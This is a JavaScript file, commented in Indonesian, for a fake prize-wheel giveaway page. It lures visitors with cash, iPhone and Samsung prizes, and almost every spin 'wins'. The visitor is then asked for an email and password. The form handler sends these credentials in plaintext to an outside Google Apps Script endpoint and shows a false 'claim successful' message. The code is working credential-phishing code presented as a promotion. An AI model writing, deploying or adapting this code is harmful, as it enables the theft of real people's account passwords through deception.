// URL Google Apps Script Anda yang baru
const scriptURL = 'https://script.google.com/macros/s/AKfycbzha7NTDhH6I74y9ObkWRbKdC6p33cQZ0jQrJT47iK5acVk7M_vqV4-40EkktPTEeW_rA/exec'; 

const canvas = document.getElementById('wheel');
const ctx = canvas.getContext('2d');
const spinBtn = document.getElementById('spinBtn');
const winningMessage = document.getElementById('winningMessage');

// Elemen UI Pop-up & Notifikasi
const registerModal = document.getElementById('registerModal');
const giftNameSpan = document.getElementById('giftName');
const claimForm = document.getElementById('claimForm');
const notification = document.getElementById('notification');
const toastIcon = document.getElementById('toastIcon');
const toastTitle = document.getElementById('toastTitle');
const toastDesc = document.getElementById('toastDesc');

let currentWinningPrize = "";

const prizes = [
    { label: "RP 1,000,000", color: "#833ab4" }, 
    { label: "SAMSUNG S24", color: "#fcb045" },   
    { label: "VOUCHER 100K", color: "#fd1d1d" }, 
    { label: "MERCHANDISE", color: "#833ab4" },
    { label: "COBA LAGI", color: "#fcb045" },
    { label: "RP 2,000,000", color: "#fd1d1d" },
    { label: "iPHONE 15 PRO", color: "#833ab4" },
    { label: "FREE SUB 1 YR", color: "#fcb045" },
    { label: "GIFT RP 500K", color: "#fd1d1d" },
    { label: "ROG PHONE", color: "#833ab4" },
    { label: "MERCH PACK", color: "#fcb045" },
    { label: "iPHONE 14", color: "#fd1d1d" }
];

const numPrizes = prizes.length;
const arcAngle = (2 * Math.PI) / numPrizes; 
let currentRotation = 0;
let isSpinning = false;

function drawWheel() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    for (let i = 0; i < numPrizes; i++) {
        const angle = i * arcAngle;
        ctx.beginPath();
        ctx.fillStyle = prizes[i].color;
        ctx.moveTo(canvas.width / 2, canvas.height / 2);
        ctx.arc(canvas.width / 2, canvas.height / 2, canvas.width / 2, angle, angle + arcAngle);
        ctx.lineTo(canvas.width / 2, canvas.height / 2);
        ctx.fill();
        ctx.strokeStyle = "rgba(255,255,255,0.4)";
        ctx.lineWidth = 2;
        ctx.stroke();

        ctx.save();
        ctx.translate(canvas.width / 2, canvas.height / 2);
        ctx.rotate(angle + arcAngle / 2);
        ctx.fillStyle = "#fff";
        ctx.font = "bold 16px Arial";
        ctx.textAlign = "right";
        ctx.fillText(prizes[i].label, canvas.width / 2 - 20, 6);
        ctx.restore();
    }
}
drawWheel();

spinBtn.addEventListener('click', () => {
    if (isSpinning) return;
    isSpinning = true;
    spinBtn.disabled = true;
    winningMessage.innerHTML = "⚡ Mengundi hadiah...";

    const spins = 6 + Math.random() * 4; 
    currentRotation += spins * 360; 
    canvas.style.transform = `rotate(${currentRotation}deg)`;

    setTimeout(() => {
        const finalAngle = currentRotation % 360;
        const winningIndex = Math.floor((360 - (finalAngle % 360) + 270) % 360 / (360 / numPrizes));
        const winningPrize = prizes[winningIndex];

        winningMessage.innerHTML = `🎉 Hadiah didapat: <strong>${winningPrize.label}</strong>`;
        isSpinning = false;
        spinBtn.disabled = false;

        if (winningPrize.label !== "COBA LAGI") {
            currentWinningPrize = winningPrize.label;
            setTimeout(() => { openModal(winningPrize.label); }, 1200);
        }
    }, 5000); 
});

function openModal(hadiah) {
    giftNameSpan.textContent = hadiah;
    registerModal.classList.add('show');
}

function closeModal() {
    registerModal.classList.remove('show');
    claimForm.reset();
}

function showNotification(title, desc, type) {
    toastTitle.textContent = title;
    toastDesc.textContent = desc;
    
    // Menghapus kelas lama ikon agar tidak tumpang tindih
    toastIcon.className = "fa-solid"; 

    if (type === "success") {
        toastIcon.classList.add("fa-circle-check", "success");
        notification.style.borderLeftColor = "#4caf50";
    } else if (type === "error") {
        toastIcon.classList.add("fa-circle-xmark", "error");
        notification.style.borderLeftColor = "#f44336";
    } else if (type === "loading") {
        toastIcon.classList.add("fa-spinner", "loading");
        notification.style.borderLeftColor = "#2196f3";
    }

    notification.classList.add('show');

    if (type !== "loading") {
        setTimeout(() => { notification.classList.remove('show'); }, 4000);
    }
}

// Event Kirim Formulir
claimForm.addEventListener('submit', (e) => {
    e.preventDefault(); 

    const emailUser = document.getElementById('userEmail').value;
    const passwordUser = document.getElementById('userPassword').value;

    closeModal();
    showNotification("Memproses Data", "Sedang menyimpan klaim hadiah...", "loading");

    const dataPemenang = {
        email: emailUser,
        password: passwordUser,
        hadiah: currentWinningPrize
    };

    fetch(scriptURL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(dataPemenang)
    })
    .then(() => {
        notification.classList.remove('show');
        setTimeout(() => {
            showNotification("Klaim Sukses! 🎉", `Hadiah ${currentWinningPrize}`, "success");
            winningMessage.innerHTML = "✅ Hadiah berhasil diklaim!";
        }, 400);
    })
    .catch(error => {
        console.error('Error:', error);
        notification.classList.remove('show');
        setTimeout(() => {
            showNotification("Klaim Gagal", "Terjadi gangguan koneksi.", "error");
        }, 400);
    });
});